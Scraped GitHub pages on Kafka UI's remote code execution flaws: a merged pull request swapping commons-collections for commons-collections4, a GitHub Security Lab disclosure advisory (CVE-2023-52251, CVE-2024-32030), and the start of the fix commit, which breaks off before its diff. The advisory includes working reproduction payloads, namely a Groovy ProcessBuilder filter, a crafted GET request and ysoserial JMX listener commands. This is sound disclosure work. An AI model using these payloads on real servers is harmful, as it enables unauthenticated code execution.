=== Content from github.com_9d9b10b3_20250110_172950.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fprovectus%2Fkafka-ui%2Fpull%2F4427)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fprovectus%2Fkafka-ui%2Fpull%2F4427)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=provectus%2Fkafka-ui)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[provectus](/provectus)
/
**[kafka-ui](/provectus/kafka-ui)**
Public

* [Notifications](/login?return_to=%2Fprovectus%2Fkafka-ui) You must be signed in to change notification settings
* [Fork
  1.2k](/login?return_to=%2Fprovectus%2Fkafka-ui)
* [Star
   10.1k](/login?return_to=%2Fprovectus%2Fkafka-ui)

* [Code](/provectus/kafka-ui)
* [Issues
  349](/provectus/kafka-ui/issues)
* [Pull requests
  65](/provectus/kafka-ui/pulls)
* [Discussions](/provectus/kafka-ui/discussions)
* [Actions](/provectus/kafka-ui/actions)
* [Security](/provectus/kafka-ui/security)
* [Insights](/provectus/kafka-ui/pulse)

Additional navigation options

* [Code](/provectus/kafka-ui)
* [Issues](/provectus/kafka-ui/issues)
* [Pull requests](/provectus/kafka-ui/pulls)
* [Discussions](/provectus/kafka-ui/discussions)
* [Actions](/provectus/kafka-ui/actions)
* [Security](/provectus/kafka-ui/security)
* [Insights](/provectus/kafka-ui/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fprovectus%2Fkafka-ui%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fprovectus%2Fkafka-ui%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# added commons-collections4 library instead of commons-collections #4427

 Merged

[Narekmat](/Narekmat)
merged 3 commits into
[master](/provectus/kafka-ui/tree/master "provectus/kafka-ui:master")
from
[rce\_jndi](/provectus/kafka-ui/tree/rce_jndi "provectus/kafka-ui:rce_jndi")

Apr 8, 2024

 Merged

# [added commons-collections4 library instead of commons-collections](#top) #4427

[Narekmat](/Narekmat)
merged 3 commits into
[master](/provectus/kafka-ui/tree/master "provectus/kafka-ui:master")
from
[rce\_jndi](/provectus/kafka-ui/tree/rce_jndi "provectus/kafka-ui:rce_jndi")

Apr 8, 2024

[Conversation
0](/provectus/kafka-ui/pull/4427)
[Commits
3](/provectus/kafka-ui/pull/4427/commits)
[Checks
10](/provectus/kafka-ui/pull/4427/checks)
[Files changed](/provectus/kafka-ui/pull/4427/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![Vladysl](https://avatars.githubusercontent.com/u/45620393?s=60&v=4)](/Vladysl)

Copy link

Collaborator

### @Vladysl **[Vladysl](/Vladysl)** commented [Apr 8, 2024](#issue-2231456581)

 *No description provided.*

Sorry, something went wrong.

All reactions

[![@Vladysl](https://avatars.githubusercontent.com/u/45620393?s=40&v=4)](/Vladysl)

`[added commons-collections4 library instead of commons-collections](/provectus/kafka-ui/pull/4427/commits/f9b99c9b8c9494cac2d6fe9ba320f2ff35278f61 "added commons-collections4 library instead of commons-collections")`

`[f9b99c9](/provectus/kafka-ui/pull/4427/commits/f9b99c9b8c9494cac2d6fe9ba320f2ff35278f61)`

 [![@Vladysl](https://avatars.githubusercontent.com/u/45620393?s=40&v=4)](/Vladysl)
[Vladysl](/Vladysl)
requested a review
from [RamanDamayeu](/RamanDamayeu)
[April 8, 2024 15:00](#event-12394514464)

 [![@Vladysl](https://avatars.githubusercontent.com/u/45620393?s=40&v=4)](/Vladysl)
[Vladysl](/Vladysl)
requested a review
from a team
as a [code owner](/provectus/kafka-ui/blob/53a6553765a806eda9905c43bfcfe09da6812035/.github/CODEOWNERS#L5)
[April 8, 2024 15:00](#event-12394514692)

[![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)](/apps/github-actions)
[github-actions](/apps/github-actions)
bot
added
the
[status/triage](/provectus/kafka-ui/labels/status/triage)
Issues pending maintainers triage
label
[Apr 8, 2024](#event-12394517825)

[![RamanDamayeu](https://avatars.githubusercontent.com/u/28390761?s=60&v=4)](/RamanDamayeu)

**[RamanDamayeu](/RamanDamayeu)**
approved these changes
[Apr 8, 2024](#pullrequestreview-1986718592)

 [View reviewed changes](/provectus/kafka-ui/pull/4427/files/f9b99c9b8c9494cac2d6fe9ba320f2ff35278f61)

[![AndreyNenashev](https://avatars.githubusercontent.com/u/2155083?s=60&v=4)](/AndreyNenashev)

**[AndreyNenashev](/AndreyNenashev)**
approved these changes
[Apr 8, 2024](#pullrequestreview-1986722713)

 [View reviewed changes](/provectus/kafka-ui/pull/4427/files/f9b99c9b8c9494cac2d6fe9ba320f2ff35278f61)

[![@Vladysl](https://avatars.githubusercontent.com/u/45620393?s=40&v=4)](/Vladysl)

`[added commons-collections4 library instead of commons-collections](/provectus/kafka-ui/pull/4427/commits/69be6565c823e53d0718a344e489cadd9426e97b "added commons-collections4 library instead of commons-collections")`

`[69be656](/provectus/kafka-ui/pull/4427/commits/69be6565c823e53d0718a344e489cadd9426e97b)`

[![@Narekmat](https://avatars.githubusercontent.com/u/47845266?s=40&v=4)](/Narekmat)
[Narekmat](/Narekmat)
added
[scope/backend](/provectus/kafka-ui/labels/scope/backend)
and removed
[status/triage](/provectus/kafka-ui/labels/status/triage)
Issues pending maintainers triage
labels
[Apr 8, 2024](#event-12396981741)

[![@Narekmat](https://avatars.githubusercontent.com/u/47845266?s=40&v=4)](/Narekmat)

`[Merge branch 'master' into rce_jndi](/provectus/kafka-ui/pull/4427/commits/df831e26379ad408ba1b38a79bda44fb669f7208 "Merge branch 'master' into rce_jndi")`

`[df831e2](/provectus/kafka-ui/pull/4427/commits/df831e26379ad408ba1b38a79bda44fb669f7208)`

[![@Narekmat](https://avatars.githubusercontent.com/u/47845266?s=40&v=4)](/Narekmat)
[Narekmat](/Narekmat)
enabled auto-merge (squash)
[April 8, 2024 18:39](#event-12397080225)

 Hide details
View details

[![@Narekmat](https://avatars.githubusercontent.com/u/47845266?s=40&v=4)](/Narekmat)
[Narekmat](/Narekmat)
merged commit [`83b5a60`](/provectus/kafka-ui/commit/83b5a60cc08501b570a0c4d0b4cdfceb1b88d6b7)
into
master

[Apr 8, 2024](https://github.com/provectus/kafka-ui/pull/4427#event-12397191894)
9 of 10 checks passed

 [![@Narekmat](https://avatars.githubusercontent.com/u/47845266?s=40&v=4)](/Narekmat)
[Narekmat](/Narekmat)
deleted the
rce\_jndi

branch
[April 8, 2024 18:46](#event-12397192156)

[![@foyaga](https://avatars.githubusercontent.com/u/62537001?s=40&v=4)](/foyaga)
[foyaga](/foyaga)
mentioned this pull request
[Jun 24, 2024](#ref-issue-2369117541)

[UI for Apache Kafka 后台 jmx jndi 代码执行漏洞（CVE-2024-32030）
foyaga/blog-timeline#273](/foyaga/blog-timeline/issues/273)

Open

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fprovectus%2Fkafka-ui%2Fpull%2F4427)

Reviewers

[![@RamanDamayeu](https://avatars.githubusercontent.com/u/28390761?s=40&v=4)](/RamanDamayeu) [RamanDamayeu](/RamanDamayeu)

RamanDamayeu approved these changes

[![@AndreyNenashev](https://avatars.githubusercontent.com/u/2155083?s=40&v=4)](/AndreyNenashev) [AndreyNenashev](/AndreyNenashev)

AndreyNenashev approved these changes

Assignees

No one assigned

Labels

[scope/backend](/provectus/kafka-ui/labels/scope/backend)

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

4 participants

[![@Vladysl](https://avatars.githubusercontent.com/u/45620393?s=52&v=4)](/Vladysl) [![@AndreyNenashev](https://avatars.githubusercontent.com/u/2155083?s=52&v=4)](/AndreyNenashev) [![@RamanDamayeu](https://avatars.githubusercontent.com/u/28390761?s=52&v=4)](/RamanDamayeu) [![@Narekmat](https://avatars.githubusercontent.com/u/47845266?s=52&v=4)](/Narekmat)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from securitylab.github.com_8fd5ccb1_20250110_172950.html ===

[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

June 19, 2024
# GHSL-2023-229\_GHSL-2023-230: Remote code execution (RCE) in UI for Apache Kafka - CVE-2023-52251, CVE-2024-32030

[![Author avatar](https://avatars.githubusercontent.com/u/44605151)
Michael Stepankin](https://github.com/artsploit)

## Coordinated Disclosure Timeline

* 2023-11-29: The report sent to maintainers.kafka-ui at provectus.com.
* 2024-01-02: A follow-up email sent.
* 2024-01-23: No response received. A private security issue has been created at https://github.com/provectus/kafka-ui/ repository.
* 2024-02-19: No response received. An additional follow-up email sent with the notification about approaching 90 days disclosure deadline.
* 2024-02-29: No response received. An additional email sent to info at provectus.com.
* 2024-02-29: The maintainer responded that they fix the vulnerabilities as soon as possible.
* 2024-04-02: A follow-up email sent.
* 2024-04-08: The maintainer responded that they going to release the fix in mid April.
* 2024-04-10: The fix is released with version 0.7.2 of Kafka UI.
* 2024-04-10 (approximate): GitHub Security Lab team became aware that one of the reported vulnerabilities (GHSL-2023-229) was also independently identified and publicly disclosed by another researcher Lars Thingstad [@Thingstad](https://github.com/Thingstad) and Daniel Christensen [@BobTheShoplifter](https://github.com/BobTheShoplifter) at https://github.com/BobTheShoplifter/CVE-2023-52251-POC.
* 2024-06-19: GitHub Security Lab published full details for GHSL-2023-229 and GHSL-2023-230/CVE-2024-32030.

## Summary

Kafka UI is affected by two remote code execution vulnerabilities. The first vulnerability in the message filtering component leads to execution of arbitrary unsandboxed groovy script. The second vulnerability can be exploited by abusing Kafka UI to connect to a malicious JMX server, which leads to RCE via unsafe deserialization. This is particularly dangerous, as Kafka UI does not have authentication enabled by default. If the authentication is enabled for the Kafka UI instance, an attacker needs to have a valid account.

## Product

UI for Apache Kafka (https://github.com/provectus/kafka-ui)

## Tested Version

[v0.7.1](https://github.com/provectus/kafka-ui/releases/tag/v0.7.1)

## Details

### Issue 1: RCE via Groovy Script Execution in message filtering (`GHSL-2023-229/CVE-2023-52251`)

Kafka UI allows to display messages going through the Kafka cluster based on the user’s provided filter. One of the filter types supported on the server is `GROOVY_SCRIPT`. By using this filter, a potentially malicious person can not only view a message’s content and properties, but also execute arbitrary code on the server. This filter is not sandboxed by any means.

Vulnerable method: [com.provectus.kafka.ui.emitter.MessageFilters#groovyScriptFilter](https://github.com/provectus/kafka-ui/blob/53a6553765a806eda9905c43bfcfe09da6812035/kafka-ui-api/src/main/java/com/provectus/kafka/ui/emitter/MessageFilters.java#L41)

```
static Predicate<TopicMessageDTO> groovyScriptFilter(String script) {
  var engine = getGroovyEngine();
  var compiledScript = compileScript(engine, script);
  var jsonSlurper = new JsonSlurper();
  return new Predicate<TopicMessageDTO>() {
    @SneakyThrows
    @Override
    public boolean test(TopicMessageDTO msg) {
      var bindings = engine.createBindings();
      bindings.put("partition", msg.getPartition());
      ...
      var result = compiledScript.eval(bindings);

```
#### Steps to reproduce

1. Run Kafka UI with the default settings and connect it to any Kafka cluster.
2. In the Kafka UI, navigate to the cluster->Topics->Messages and create a new filter with the following content:

```
new ProcessBuilder("touch","/tmp/pwnd.txt").start()

```

![image](/assets/img/post-images/GHSL-2023-229-KafkaUI/Image1.png)

The same can be done by sending a following GET request to the application:

```
GET /api/clusters/local/topics/topic/messages?q=new+ProcessBuilder%28%22touch%22%2C%22%2Ftmp%2Fpwnd.txt%22%29.start%28%29&filterQueryType=GROOVY_SCRIPT&attempt=7&limit=100&page=0&seekDirection=FORWARD&keySerde=String&valueSerde=String&seekType=BEGINNING HTTP/1.1
Host: 127.0.0.1:8091

```

1. If the current topic has any messages, the script will be evaluated immediately on the server. Alternatively, you can send a new message to the broker using the Kafka UI interface to trigger the script execution.
2. After the execution, a `/tmp/pwnd.txt` file will be created on the server.

#### Impact

This issue may lead to post-auth remote code execution. This is particularly dangerous as Kafka UI does not have authentication enabled by default.

### Issue 2: RCE via JNDI resolution in JMX metrics collection (`GHSL-2023-230/CVE-2024-32030`)

Kafka UI API allows users to connect to different Kafka brokers by specifying their network address and port. As a separate feature, it also provides the ability to monitor the performance of Kafka brokers by connecting to their JMX ports. JMX is based on the RMI protocol, so it is inherently susceptible to deserialization attacks.
A potential attacker can exploit this feature by connecting Kafka UI backend to its own malicious broker. Instead of setting up a legitimate JMX port, an attacker can create an RMI listener that returns a malicious serialized object for any RMI call. In the worst case it could lead to remote code execution as Kafka UI has the required gadget chains in its classpath.

Prerequisites: This vulnerability affects the deployments where one of the following occurs:

1. `dynamic.config.enabled` property is set in settings. It’s not enabled by default, but it’s suggested to be enabled in many tutorials for Kafka UI, including its own README.md.
2. OR an attacker has access to the Kafka cluster that is being connected to Kafka UI. In this scenario the attacker can exploit this vulnerability to expand their access and execute code on Kafka UI as well.

#### Steps to reproduce

1. Run Kafka UI with the default settings and `dynamic.config.enabled=true`.
2. Start any Kafka broker with a plaintext listener and no auth(locally or in docker). Do not connect it to Kafka UI yet.
3. Now we need to set up a malicious JMX listener. We are going to use the [ysoserial tool](https://github.com/artsploit/ysoserial) to generate a serizalied object with a payload for remote code execution. For this demonstration, I prepared a special fork of ysoserial in my repository: https://github.com/artsploit/ysoserial/tree/scala1
   You can clone and run it with the following commands:

```
git clone https://github.com/artsploit/ysoserial/
cd ysoserial && git checkout scala1
mvn package -D skipTests=true #make sure you use Java 8 for compilation, it might not compile with recent versions
java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1718 Scala1 "org.apache.commons.collections.enableUnsafeSerialization:true"

```

The tool will listen on port 1718 for incoming connections.

1. In the Kafka UI, navigate to the Dashboard->Configure New Cluster and put the address of your kafka broker along with the ysoserial’s JMX port 1718. Make sure you run kafka broker and ysoserial on the localhost or the same host.

![Image1](/assets/img/post-images/GHSL-2023-230-KafkaUI/Image1.png)

1. As soon as you add this cluster, you can see an incoming connection in the ysoserial tool. It will respond to the Kafka UI with the malicious payload.

![Image2](/assets/img/post-images/GHSL-2023-230-KafkaUI/Image2.png)

This payload will be deserialized on the Kafka UI side. **It does not trigger RCE directly**, but leads to setting the system property `org.apache.commons.collections.enableUnsafeSerialization` to `true`. You may notice some errors in Kafka UI logs, this is expected:

![Image3](/assets/img/post-images/GHSL-2023-230-KafkaUI/Image3.png)

1. Next, to actually get an RCE, you need to re-run ysoserial with the following command:

```
java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1718 CommonsCollections7 "touch /tmp/pwnd2.txt"

```

If you wait a little longer, Kafka UI will reconnect to this JMX port to fetch metrics again, which triggers the deserialization of another object. As long as `org.apache.commons.collections.enableUnsafeSerialization` has been enabled earlier by another payload, it will lead to the execution of the `touch /tmp/pwnd2.txt` command in the Kafka UI java process.

Again, the Kafka UI log output will be full of errors, but that’s expected: all exceptions are thrown after the deserialization has happened and the command was executed:

![Image4](/assets/img/post-images/GHSL-2023-230-KafkaUI/Image4.png)

If you’re curious how deserialization triggers `System.setProperty` and command execution, feel free to have a look the source code for corresponding gadget chains: [Scala1.java](https://github.com/artsploit/ysoserial/blob/scala1/src/main/java/ysoserial/payloads/Scala1.java) and [CommonsCollections7.java](https://github.com/artsploit/ysoserial/blob/scala1/src/main/java/ysoserial/payloads/CommonsCollections7.java)
Also, you may set a breakpoint at [StreamRemoteCall.java#L271](https://github.com/openjdk/jdk/blob/12723688ca49d379d43fd0fd0e55a28afe299687/src/java.rmi/share/classes/sun/rmi/transport/StreamRemoteCall.java#L271) to see how an object is deserialized.

#### Impact

This issue may lead to post-auth remote code execution. This is particularly dangerous as Kafka-UI does not have authentication enabled by default.

## CVE

* CVE-2023-52251
* CVE-2024-32030

## Credit

These issues were discovered and reported by GHSL team member [@artsploit (Michael Stepankin)](https://github.com/artsploit). Independently of GitHub Security lab, CVE-2023-52251 was also discovered by [Lars Thingstad (@Thingstad)](https://github.com/Thingstad) and [Daniel Christensen (@BobTheShoplifter)](https://github.com/BobTheShoplifter), who published their advisory at https://github.com/BobTheShoplifter/CVE-2023-52251-POC.

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2023-229` or `GHSL-2023-230` in any communication regarding these issues.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information



=== Content from github.com_73668946_20250110_172949.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fprovectus%2Fkafka-ui%2Fcommit%2F83b5a60cc08501b570a0c4d0b4cdfceb1b88d6b7)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fprovectus%2Fkafka-ui%2Fcommit%2F83b5a60cc08501b570a0c4d0b4cdfceb1b88d6b7)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=provectus%2Fkafka-ui)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[provectus](/provectus)
/
**[kafka-ui](/provectus/kafka-ui)**
Public

* [Notifications](/login?return_to=%2Fprovectus%2Fkafka-ui) You must be signed in to change notification settings
* [Fork
  1.2k](/login?return_to=%2Fprovectus%2Fkafka-ui)
* [Star
   10.1k](/login?return_to=%2Fprovectus%2Fkafka-ui)

* [Code](/provectus/kafka-ui)
* [Issues
  349](/provectus/kafka-ui/issues)
* [Pull requests
  65](/provectus/kafka-ui/pulls)
* [Discussions](/provectus/kafka-ui/discussions)
* [Actions](/provectus/kafka-ui/actions)
* [Security](/provectus/kafka-ui/security)
* [Insights](/provectus/kafka-ui/pulse)

Additional navigation options

* [Code](/provectus/kafka-ui)
* [Issues](/provectus/kafka-ui/issues)
* [Pull requests](/provectus/kafka-ui/pulls)
* [Discussions](/provectus/kafka-ui/discussions)
* [Actions](/provectus/kafka-ui/actions)
* [Security](/provectus/kafka-ui/security)
* [Insights](/provectus/kafka-ui/pulse)

## Commit

[Permalink](/provectus/kafka-ui/commit/83b5a60cc08501b570a0c4d0b4cdfceb1b88d6b7)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

added commons-collections4 library instead of commons-collections ([#4427](https://github.com/provectus/kafka-ui/pull/4427)

[Browse files](/provectus/kafka-ui/tree/83b5a60cc08501b570a0c4d0b4cdfceb1b88d6b7)
Browse the repository at this point in the history

```
)

Co-authored-by: Narekmat <47845266+Narekmat@users.noreply.github.com>
```

* Loading branch information

[![@Vladysl](https://avatars.githubusercontent.com/u/45620393?s=40&v=4)](/Vladysl) [![@Narekmat](https://avatars.githubusercontent.com/u/47845266?s=40&v=4)](/Narekmat)

[Vladysl](/provectus/kafka-ui/commits?author=Vladysl "View all commits by Vladysl")
and
[Narekmat](/provectus/kafka-ui/commits?author=Narekmat "View all commits by Narekmat")
authored
Apr 8, 2024

1 parent
[3dc4446](/provectus/kafka-ui/commit/3dc4446321716016e4c2517be4e04a692cdee7a7)

commit 83b5a60

 Show file tree

 Hide file tree

Showing
**4 changed files**
with
**14 additions**
and
**5 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* kafka-ui-api

  + kafka-ui-api/pom.xml
    [pom.xml](#diff-82b0ea2e4ca23e3c4113a85a4ffcb96997ffc02315df754b757750b1efb766a0)
  + src/main/java/com/provectus/kafka/ui

    - model/rbac

      * kafka-ui-api/src/main/java/com/provectus/kafka/ui/model/rbac/Permission.java
        [Permission.java](#diff-93df69e657cc397dc99ce332bc47cfc3b6579ca6b17ab54fa6275da75f319807)
    - service

      * integration/odd

        + kafka-ui-api/src/main/java/com/provectus/kafka/ui/service/integration/odd/ConnectorInfo.java
          [ConnectorInfo.java](#diff-ac0c0ab6073590260599beec5718d564bcda79a01043970ae6d42a0e20ec693f)
      * rbac

        + kafka-ui-api/src/main/java/com/provectus/kafka/ui/service/rbac/AccessControlService.java
          [AccessControlService.java](#diff-37e769f4709c1e78c076a5949bbcead74e969725bfd89c7c4ba6d6f229a411e6)

## There are no files selected for viewing

13 changes: 11 additions & 2 deletions

13
[kafka-ui-api/pom.xml](#diff-82b0ea2e4ca23e3c4113a85a4ffcb96997ffc02315df754b757750b1efb766a0 "kafka-ui-api/pom.xml")

Show comments

[View file](/provectus/kafka-ui/blob/83b5a60cc08501b570a0c4d0b4cdfceb1b88d6b7/kafka-ui-api/pom.xml)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

